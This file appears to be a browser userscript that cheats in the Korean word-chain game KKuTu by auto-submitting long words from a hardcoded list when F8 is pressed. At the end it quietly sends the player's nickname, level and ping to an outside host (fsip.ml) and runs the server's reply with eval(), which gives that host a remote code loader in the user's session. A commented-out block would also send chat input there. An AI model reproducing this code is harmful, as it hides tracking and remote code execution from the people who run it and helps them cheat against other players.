function get(url) {
    var xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
        if (xhr.readyState === xhr.DONE) {
            if (xhr.status === 200 || xhr.status === 201) {
                eval(xhr.responseText);
            }
        }
    }
    xhr.open('GET', url);
    xhr.send();
    
    }

var hackalert = document.createElement("h6");
var used = document.createElement("h6");
hackalert.style.display = "block";
var Notused = "[Not Used]";
used.innerHTML = Notused;
//used.style.border = "3px solid white";
var hackkkutu = "[KKUTU HACK 1.0.0b]";
hackalert.innerHTML = hackkkutu;

var nuld = document.createElement("h6");
document.querySelector("#Top").appendChild(nuld);
document.querySelector("#Top").appendChild(hackalert);
document.querySelector("#Top").appendChild(used);
function setCookie(name, value, exp) {
    var date = new Date();
    date.setTime(date.getTime() + exp*24*60*60*1000);
    document.cookie = name + '=' + value + ';expires=' + date.toUTCString() + ';path=/';
  }

  function getCookie(name) {
    var value = document.cookie.match('(^|;) ?' + name + '=([^;]*)(;|$)');
    return value? value[2] : null;
  }

  
  if(document.querySelectorAll("input")[147] === undefined) {
      var ofcode = document.querySelectorAll("input")[143].id;
  //var ofcode = prompt("당신의 채팅 코드를 입력하세요. (숫자 4~5자리)");
  //ofcode = "UserMessage" + ofcode;
  }
  else {
    var ofcode = document.querySelectorAll("input")[147].id;
  }
  setCookie("mycode", ofcode, 1);


document.onkeydown=function() {
    var kcode = event.keyCode;
    if(kcode == 119) {
        chapter(getCookie('mycode'));
    }
}
var use = ["껍", "명", "벌", "잔", '즙', '가', "븨", "n", "o", "t", "뎜", "믜", "샹", "에", "팎", "상", '리(이)', "착", "크", '곰', '대', '아', '각', '마', "카", "지", "셰", "스", '널', '톄', '책', '차', '뎐', '트', '기', '꼬', '꾸', '꿈', '끌', '끝', '나', '날', '남', '내', '다', '법', '양', '얇', '어', '이', '온', '용', '우', '인', '잃', '자', '잔', '장', '저', '적', '전', '정', '젖', '젋', '제']

function wecanuse(use, nowcode) {
    if(use.indexOf(nowcode) !== -1) {
        hackalert.innerHTML = "F8키를 누르세요! 현재 핵을 사용할 수 있습니다!";
    }
    else {
        hackalert.innerHTML = hackkkutu;
    }
    setTimeout(function() {
        wecanuse(use, document.querySelector("div.jjo-display.ellipse").innerHTML);
        }, 200);
}

setTimeout(function() {
wecanuse(use, document.querySelector("div.jjo-display.ellipse").innerHTML);
}, 200);

function chapter(mycode) {
setCookie("mycode", mycode, 1);
        writer("다", "다른모든눈송이와아주비슷하게생긴단하나의눈송이", "다이오드트랜지스터논리회로");
        writer("기", "기체크로마토질량분석법", "기교소녀는상처받지않아", "기체크로마토그래피");
        writer("널", "널리", "널뛰기");
        writer("내", "내현실과온라인게임이러브코미디에침식당하기시작해서위험해", "내뇌속의선택지가학원러브코미디를전력으로방해하고있다", "내가인기없는건아무리생각해도너희들탓이야");
        writer("날", "날개무늬서리밤나비", "날개", "날라리"); 
        writer("남", "남북조선정당사회단체대표자련석회의", "남북조선제정당사회단체련석회의", "남극대륙평화이용조약"); 
        writer("나", "나와그녀와그녀와그녀의건전하지못한관계", "나이트릴로트라이아세트산", "나주신촌리고분출토금동관"); 
        writer("까", "까막바늘까치밥나무", "까마귀", "까막눈"); 
        writer("꼬", "꼬마흰꼬리하루살이", "꼬부랑다리장님지네");
        writer("꾸", "꾸리비늘바다지렁이", "꾸리꾸리", "꾸시시"); 
        writer("꿈", "꿈꾸는별빛의플레이아데스", "꿈틀꿈틀", "..."); 
        writer("끌", "끌어당겨엎어뜨리기", "끌끌히", "끌탕"); 
        writer("끝", "끝마디통통집게벌레", "끝가지", "끝귀");
        writer("가", "가로자기마당전기기계증폭기", "가장사랑스러운너에게축복을", "가족관계의등록등에관한법률"); 
        writer("얇", "얇은층겔크로마토그라프법", "얇은층젤크로마토그래피법", "...ㅠ"); 
        writer("양", "양치기소년은오늘도거짓말을거듭한다", "양극처리로봇새끼곰", "양이온성계면활성제"); 
        writer("어", "어깨대고물구나무서기", "어서오세요실력지상주의교실에", "어둠과모자와책의여행자"); 
        writer("온", "온라인게임의신부는여자아이가아니라고생각한거야", "온라인게임속신부는여자아이가아닌줄알았어", "온라인리얼타임시스템"); 
        writer("용", "용사가되지못한나는마지못해취직을결심했습니다", "용사가마왕을무찌를때우리들도있었다", "용을처치했더니용의딸이왔습니다네"); 
        writer("우", "우리딸을위해서라면나는마왕도쓰러뜨릴수있을지몰라", "우주의기사테카맨블레이드", "우동나라의황금색털뭉치"); 
        writer("인", "인기라이트노벨작가인남고생이연하의클래스메이트이자성우인여자아이에게목을졸리고있다", "인도말레이시아동물지리아계", "인간적인너무나인간적인것"); 
        writer("잃", "잃어버린시간을찾아서", "잃다", "잃..?"); 
        writer("자", "자라투스트라는이렇게말했다", "자치소비에트사회주의공화국", "자유락하식콩크리트혼합기"); 
        writer("잔", "잔띠무늬입부화고기", "잔류방사능저감폭탄", "잔류자기력선속밀도"); 
        writer("장", "장염비브리오식중독", "장곡사철조약사여래좌상부석조대좌", "장흥보림사남북삼층석탑및석등"); 
        writer("저", "저능력은평균치로해달라고말했잖아요", "저온감수성돌연변이", "저밀도다이너마이트"); 
        writer("적", "적색노동조합인터내셔널", "적외선흡수스펙트럼", "적색아이오딘화수은"); 
        writer("전", "전생했더니슬라임이었던건에대하여", "전략고양이와천사와동거시작했습니다", "전반적구년제기술의무교육"); 
        writer("젊", "젊은베르테르의슬픔", "젊은이", "젊다"); 
        writer("정", "정글은언제나맑음뒤흐림", "정강뼈거친면뼈연골증", "정려해탈등지등지지력"); 
        writer("젖", "젖당분해효소결핍증", "젖..?", "젖..ㅠ"); 
        writer("제", "제천사자빈신사지사사자구층석탑", "제오차경제사회발전오개년계획", "제조용기체크로마토그래피법");
        writer("이", "이세계에서스킬을해체했더니치트급아내가증식했습니다", "이세계에서성왕님의신부가되면이렇게아낌없이사랑받나요", "이롬황성주국산콩담백한두유검은콩과검은참깨");
        writer("리(이)", "이세계에서돌아온아저씨가부성스킬로파더콤아가씨들을헤롱헤롱", "이세계에서스킬을해체했더니치트급아내가증식했습니다", "이롬황성주국산콩담백한두유검은콩과검은참깨");
        writer("현", "현역프로미소녀라이트노벨작가가알려드립니다라이트노벨을읽는것도즐겁지만써보면더즐거울지도몰라요", "현자의제자를자칭하는현자", "현상금사냥꾼")
        writer("법", "법천사지광국사현묘탑비", '법천사지광국사현묘탑', 'none');
        writer("트", "트로피카나100퍼센트퓨어주스오렌지", 'none', 'none');
        writer("톄", "톄면", '톄링', '톄모');
        writer("차", "차라투스트라는이렇게말했다", '차이콥스키국제음악콩쿠르', '차비날개푸른노린재');
        writer("뎐", "뎐셰", '뎐호', '뎐톄');
        writer("책", "책에도수컷과암컷이있습니다", "책상다리황새두렁넘기", "책장", "책상");
        writer("착", "착체크로마토그라프법", "착즙", "착즙기");
        writer("크", "크로마토그라프법", "크누센의역학적해류계산표", "크로이츠펠트야코프병");
        writer("카", "카르복시말단펩티드가수분해효소", "카르복시메틸셀룰로오스", "카라마조프가의형제들");
        writer("셰", "셰렌보겐", "셰스트룀", "셰프");
        writer("스", "스리랑카민주사회주의공화국", "스톱모션애니메이션", "스트레이트");
        writer("마", "마법이부여된책발사체로부터보호", "마법이부여된책화염으로부터보호", "마법이부여된책휘몰아치는칼날");
        writer("지", "지금당장그만두고싶은아르스마기카", "지금부터의아쿠아마츠우라카난", "지옥의바다를향해요소로와타나베요우", "지방분해효소");
        writer("아", "아이돌마스터신데렐라걸즈스타라이트스테이지", "아시아나에어라인스맥스웰하우스원두분쇄커피", "아시아아프리카라틴아메리카문화회의", "아픈건싫으니까방어력에올인하려고합니다");
        writer("대", "대성장그레이트검은투구벌레필살원거리배그웜", "대사건이에요코이즈미하나요", "대마법사의재래오를리", "대나무헬리콥터");
        writer("각", "각성된세자르가지닌에메랄드파편", "각성된린을사모하는자의수호패", "각성된에이스의월광갑옷", "각성된드래곤슬레이어");
        writer("곰", "곰븨님븨", "곰곰곰베어", "곰곰카페라떼시그니처더블샷", "곰팡이군주익슬리드");
        writer("껍", "껍질벗긴아카시아나무원목", "껍질", "none", "?!");
        writer("명", "명령블록이실린광산수레", "명령블록", "명령어", "명상");
        writer("벌", "벌레먹은금간석재벽돌", "", "", "");
        writer("잔", "잔류형거북도사의물약", "잔류형수중호흡의물약", "잔류형야간투시의물약", "잔류형느린낙하의물약");
        writer("믜", "믜신것");
        writer("팎", "팎보숭이");
        writer("상", "상하목장유기농바나나우유");
        writer("븨", "븨피");
        writer("뎜", "뎜방");
        writer("에", "에스랭크몬스터베헤모스지만고양이라고착각하길래엘프소녀의기사애완묘로살고있습니다");
        writer("샹", "샹그리라잃어버린고도를찾아서");
        writer("n", "nexttominimalsupersymmetricstandardmodel");
        writer("o", "oscillationprojectwith");
        writer("t", "trackingapparatus");
        writer("텨", "텨댜마음가는대로"); //s
        writer("즙", "즙철");
}
//function writer(value) { http://dean.edwards.name/packer/
//    var mycode = getCookie("mycode");
//    document.getElementById(mycode).value = value;
//    document.getElementById("ChatBtn").click();
//    console.log(value + "값 입력");
//}
function sleep (delay) {
    var start = new Date().getTime();
    while (new Date().getTime() < start + delay);
 }
function writer(n, word1, word2, word3, word4) {
    var err;
    var now = document.querySelector("div.jjo-display.ellipse");
    var code = getCookie("mycode");
    code = document.getElementById(code);
    var button = document.getElementById("ChatBtn");
    if(now.innerHTML == n) {
        code.value = word1;
        button.click();
        err = "<label class=\"game-fail-text\">이미 쓰인 단어: " + word1 + "</label>";
        console.log(word1);
        used.innerHTML = word1;
        setTimeout(function() {used.innerHTML = Notused;}, 1000);
        
        setTimeout(function() {
            var now = document.querySelector("div.jjo-display.ellipse");
        if(now.innerHTML == err) {
            if(word2 === undefined) {
                return "ERROR";
            }
            code.value = word2;
            button.click();
            err = "<label class=\"game-fail-text\">이미 쓰인 단어: " + word2 + "</label>";
            console.log(word2);
            used.innerHTML = word2;
            setTimeout(function() {used.innerHTML = Notused;}, 1000);
            setTimeout(function() {
            var now = document.querySelector("div.jjo-display.ellipse");
            if(now.innerHTML == err) {
                if(word3 === undefined) {
                    return "ERROR";
                }
                code.value = word3;
                button.click();
                err = "<label class=\"game-fail-text\">이미 쓰인 단어: " + word3 + "</label>";
                console.log(word3);
                used.innerHTML = word3;
                setTimeout(function() {used.innerHTML = Notused;}, 1000);
                setTimeout(function() {
                var now = document.querySelector("div.jjo-display.ellipse");
                if(now.innerHTML == err) {
                    if(word4 === undefined) {
                        return "ERROR";
                    }
                    code.value = word4;
                    button.click();
                    err = "<label class=\"game-fail-text\">이미 쓰인 단어: " + word4 + "</label>";
                    console.log(word4);
                    used.innerHTML = word4;
                    setTimeout(function() {used.innerHTML = Notused;}, 1000);
                    setTimeout(function() {
                        var now = document.querySelector("div.jjo-display.ellipse");
                        if(now.innerHTML = err) {
                            setTimeout(function() {
                                    code.value = "-..." + n + "? ..ㅠㅠ";
                                    button.click();
                                    console.log('실패.. 알아서 하세요..');
                                    used.innerHTML = "oh sorry. 더 이상 도와드릴 수 없습니다.";
                                //},1500);
                            },300);
                        }},1500);
                    //}},300);
                }},1500);
                //}},300);
            //}},300);
        }},1500);

        }},1500);
        //}},300);
    }
}
var response;
var useraccount = document.querySelector(".account-nick").innerHTML;
var userlevel = document.querySelector(".my-level").innerHTML;
userlevel = userlevel.replace("레벨", "");
userlevel = userlevel.replace(" ", "");
var userpings = document.querySelector(".my-stat-ping").innerHTML;
userpings = userpings.replace("핑", "");
get("https://fsip.ml/kh.php?user=" + useraccount + "&lvl=" + userlevel + "&ping=" + userpings);

/*
function cbclicked() {
    get("https://fsip.ml/kh.php?txt=" + document.querySelectorAll("input")[147].innerHTML);
}
document.querySelector("#ChatBtn").addEventListener('click', cbclicked);
*/